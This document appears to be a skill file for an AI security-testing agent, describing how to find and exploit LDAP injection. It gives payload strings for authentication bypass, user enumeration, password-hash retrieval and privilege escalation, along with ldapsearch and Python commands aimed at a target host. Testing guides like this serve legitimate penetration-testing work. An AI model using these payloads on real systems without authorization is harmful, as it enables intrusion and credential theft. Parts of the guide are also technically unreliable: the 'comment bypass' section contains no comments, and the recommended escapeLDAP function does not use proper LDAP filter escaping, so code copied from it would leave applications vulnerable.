---
name: ldap-injection-testing
description: Professional skills and methodology for LDAP-injection vulnerability testing
version: 1.0.0
---

# LDAP-Injection Vulnerability Testing

## Overview

LDAP injection is similar to SQL injection — it exploits flaws in how LDAP queries are constructed, potentially causing information disclosure or privilege bypass. This skill provides detection, exploitation, and defense methods.

## How it works

The application concatenates user input directly into an LDAP query without adequate validation and filtering, letting an attacker alter the query logic.

**Dangerous code example:**
```java
String filter = "(&(cn=" + userInput + ")(userPassword=" + password + "))";
ldapContext.search(baseDN, filter, ...);
```

## LDAP basics

### Query syntax

**Basic queries:**
```
(cn=John)
(objectClass=person)
(&(cn=John)(mail=john@example.com))
(|(cn=John)(cn=Jane))
(!(cn=John))
```

### Special characters

**Characters that must be escaped:**
- `(` `)` — parentheses
- `*` — wildcard
- `\` — escape character
- `/` — path separator
- `NUL` — null byte

## Testing methodology

### 1. Identify LDAP input points

**Common features:**
- User login
- User search
- Directory browsing
- Permission checks

### 2. Basic detection

**Test special characters:**
```
*)(&
*)(|
*))(
*))%00
```

**Test logical operators:**
```
*)(&(cn=*
*)(|(cn=*
*))(!(cn=*
```

### 3. Authentication bypass

**Basic bypass:**
```
Username: *)(&
Password: *
Query: (&(cn=*)(&)(userPassword=*))
```

**More precise bypass:**
```
Username: admin)(&(cn=admin
Password: *))
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

### 4. Information disclosure

**Enumerate users:**
```
*)(cn=*
*)(uid=*
*)(mail=*
```

**Retrieve attributes:**
```
*)(|(cn=*)(userPassword=*
*)(|(objectClass=*)(cn=*
```

## Exploitation techniques

### Authentication bypass

**Method 1: logical bypass**
```
Input: *)(&
Query: (&(cn=*)(&)(userPassword=*))
Result: matches all users
```

**Method 2: comment-style bypass**
```
Input: admin)(&(cn=admin
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

**Method 3: wildcards**
```
Input: *)(|(cn=*)(userPassword=*
Query: (&(cn=*)(|(cn=*)(userPassword=*)(userPassword=*))
```

### Information disclosure

**Enumerate all users:**
```
Search: *)(cn=*
Result: returns all cn attributes
```

**Retrieve password hashes:**
```
Search: *)(|(cn=*)(userPassword=*
Result: returns users and password hashes
```

**Retrieve sensitive attributes:**
```
Search: *)(|(cn=*)(mail=*)(telephoneNumber=*
Result: returns multiple sensitive attributes
```

### Privilege escalation

**Alter query logic:**
```
Original: (&(cn=user)(memberOf=CN=Users,DC=example,DC=com))
Injected: user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user
Result: may bypass the permission check
```

## Bypass techniques

### Encoding bypass

**URL encoding:**
```
*)(& → %2A%29%28%26
*)(| → %2A%29%28%7C
```

**Unicode encoding:**
```
* → \u002A
( → \u0028
) → \u0029
```

### Comment bypass

**Using comments:**
```
*)(&(cn=*
*)(|(cn=*
```

### Null-byte injection

**Using NULL bytes:**
```
*))%00
```

## Tool usage

### JXplorer

**Graphical LDAP client:**
- Connect to LDAP servers
- Browse directory structure
- Run test queries

### ldapsearch

```bash
# Basic query
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"

# Test injection
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)(&"
```

### Burp Suite

1. Intercept the LDAP query request
2. Modify query parameters
3. Observe the response

### Python scripts

```python
import ldap3

server = ldap3.Server('ldap://target.com')
conn = ldap3.Connection(server, authentication=ldap3.SIMPLE,
                        user='cn=admin,dc=example,dc=com',
                        password='password')

# Test injection
filter_str = '*)(&'
conn.search('dc=example,dc=com', filter_str)
print(conn.entries)
```

## Verification and reporting

### Verification steps

1. Confirm you control the LDAP query
2. Verify authentication bypass or information disclosure
3. Assess impact (unauthorized access, data leakage, etc.)
4. Record a complete PoC
5. Log the confirmed vulnerability via the `report_finding` tool (the platform's sole entry point for recording vulnerabilities), covering location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting essentials

- Vulnerability location and input parameter
- How the LDAP query is constructed
- Complete exploitation steps and PoC
- Remediation advice (input validation, parameterized queries, etc.)

## Defenses

### Recommended

1. **Input validation**
   ```java
   private static final String[] LDAP_ESCAPE_CHARS = 
       {"\\", "*", "(", ")", "\0", "/"};
   
   public static String escapeLDAP(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(LDAP_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parameterized queries**
   ```java
   // Use the LDAP API's parameterization
   String filter = "(&(cn={0})(userPassword={1}))";
   Object[] args = {escapedCN, escapedPassword};
   // Build the query via the API
   ```

3. **Allowlist validation**
   ```java
   // Allow only specific characters
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Least privilege**
   - Bind with a minimal-privilege account
   - Restrict queryable attributes
   - Use access-control lists

5. **Error handling**
   - Never return detailed error messages
   - Uniform error responses
   - Log errors

## Notes

- Test only in authorized environments
- Mind syntax differences across LDAP servers
- Avoid impacting the directory while testing
- Understand the target LDAP server's configuration
